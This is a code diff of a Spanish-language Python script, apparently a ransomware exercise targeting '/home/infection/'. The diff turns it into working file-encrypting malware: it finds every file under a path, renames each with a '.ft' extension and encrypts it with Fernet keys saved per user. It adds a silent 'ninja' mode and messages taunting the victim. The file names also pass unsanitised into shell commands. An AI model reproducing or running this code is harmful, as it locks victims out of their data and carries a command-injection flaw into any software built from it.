@@ -5,6 +5,7 @@
 #-----------------------------------------LIBRERIAS------------------------------------------------------
 
 import argparse
+from audioop import reverse
 import os
 from cryptography.fernet import Fernet
 
@@ -19,10 +20,11 @@ user = os.popen('whoami').read()[:-1]
 #---------------------------------------CONFIGURACION----------------------------------------------------
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-h')
-parser.add_argument('-r')
-parser.add_argument('-v')
-parser.add_argument('-s', help = "Ejecuta el programa sin que salga nada por consola", action= "store_true", default = False)
+#parser.add_argument('-h')
+parser.add_argument("-r", "--reverse", help = 'Desencripta todos los archivos con extensión ".ft"... Si tienes la clave adecuada claro', action = 'store_true', default = False)
+parser.add_argument('-v', '--version', action = 'version', version = 'beta 1.0', help = "Muestra la versión del programa, por si deseas actualizarlo")
+parser.add_argument('-s', '--silent', help = "Ejecuta el programa sin que salga nada por consola ﱲ", action= "store_true", default = False, dest = 'ninja')
+args = parser.parse_args()
 with open (".claves.key", "a") as archivo_clave:
         pass
 
@@ -30,24 +32,45 @@ with open (".claves.key", "a") as archivo_clave:
 #-----------------------------------------FUNCIONES------------------------------------------------------
 
 def listar_archivos(ruta):
+    
     archivos = []
-    nombres = os.popen('ls ' + ruta).read()
-    nombres = nombres.strip('\n').split('\n')
-    for elem in nombres:
-        if not elem.endswith('.ft'):
-            os.system(f"mv {ruta}/{elem} {ruta}/{elem.split('.')[0]}.ft")
-            archivos.append(elem.split('.')[0] + '.ft')
+   
+    nombres = os.popen('find '+ ruta +' -type f 2> /dev/null').read()
+    if nombres != '':
+        nombres = nombres.strip('\n').replace('./', '').split('\n')
+        for elem in nombres:
+            if args.reverse:
+                if elem.endswith('.ft') and (len(elem.split('.')) > 2):
+                    if '.unknow' in elem:
+                        os.system(f"mv {elem} {elem.split('.')[0]}")
+                        archivos.append(elem.split('.')[0])
+                    else:
+                        os.system(f"mv {elem} {elem[:-3]}")
+                        archivos.append(elem[:-3])
+            else:
+                if not elem.endswith('.ft'):
+                    if '.' not in elem:
+                        os.system(f"mv {elem} {elem}.unknow.ft")
+                        archivos.append(elem + '.unknow.ft')
+                    else:
+                        os.system(f"mv {elem} {elem}.ft")
+                        archivos.append(elem + '.ft')
     return archivos
+
+    
 
 def guardar_key(user):
     with open (".claves.key", "r") as archivo_clave:
         for linea in archivo_clave:
             if (user + ' :') in linea[:(len(user) + 2)]:
-                #print ('el usuario ya existe')
+                if not args.ninja and not args.reverse:
+                    print ('El usuario ya existe. Ya te hemos hackeado?')
                 return 0
         key = Fernet.generate_key()
         with open (".claves.key", "a") as archivo_clave:
             archivo_clave.write(user + ' : ' + str(key) + '\n')
+        if not args.ninja:
+            print ('Clave generada con exito.')
 
 def recuperar_key(user):
     try:
@@ -63,31 +86,50 @@ def recuperar_key(user):
 
 def codificar(lista, key):
     for elem in lista:
-        with open ('/home/infection/' + elem, 'rb') as file:
+        with open (elem, 'rb') as file:
             mensaje = file.read()
             f = Fernet(key)
             encriptado = f.encrypt(mensaje)
-        with open ('/home/infection/'+ elem, 'wb') as cryp:
+        with open (elem, 'wb') as cryp:
             cryp.write(encriptado)
+        if not args.ninja:
+            print (f"ﱘﱘ Cojo {elem.split('/')[-1]}, lo encripto con una clave, y ya son un monton de ficheros que he encriptado esta tarde. ﱘﱘ")
 
 def decodificar(lista, key):
     for elem in lista:
-        with open ('/home/infection/' + elem, 'rb') as file:
+        with open (elem, 'rb') as file:
             mensaje = file.read()
             f = Fernet(key)
             encriptado = f.decrypt(mensaje).decode()
-        with open ('/home/infection/'+ elem, 'w') as cryp:
+        with open (elem, 'w') as cryp:
             cryp.write(encriptado)
+        if not args.ninja:
+            print (f"Ya puedes volver a leer {elem}")
 
-# esto ya seria ejecucion creo
-# listado de cosas a hacer:
-#       - recoges usuario e IP(o algo similar/ no ha podido ser por ahora) y anades al diccionario usuario/key (mejor en el archivo claves.key)
-#       - recopilas los archivos en la lista
-#       - codificas los archivos con la key del usuario
 #--------------------------------------------------------------------------------------------------------
 #-----------------------------------------EJECUCION------------------------------------------------------
 
+if not args.ninja:
+    if args.reverse:
+        print ("Venga, va, recuperemos esa información valiosísima")
+    else:
+        print ("Encriptemos cosas")
+
 archivos = listar_archivos(ruta)
-guardar_key(user)
-codificar(archivos, recuperar_key(user))
-decodificar(archivos, recuperar_key(user))
+
+
+if not args.ninja:
+    print ("Estamos analizando los archivos con los que trabajar.")
+    if not archivos:
+        print ("Pues parece que no hay nada con lo que trabajar")
+        print ("Lo mas probable es que la ruta no exista o que no haya archivos con los que trabajar")
+    else:
+        print ("Estos son los archivos que hemos encontrado:")
+        for elem in archivos: print (f"- {elem}")
+
+        guardar_key(user)
+
+        if args.reverse:
+            decodificar(archivos, recuperar_key(user))
+        else:
+            codificar(archivos, recuperar_key(user))
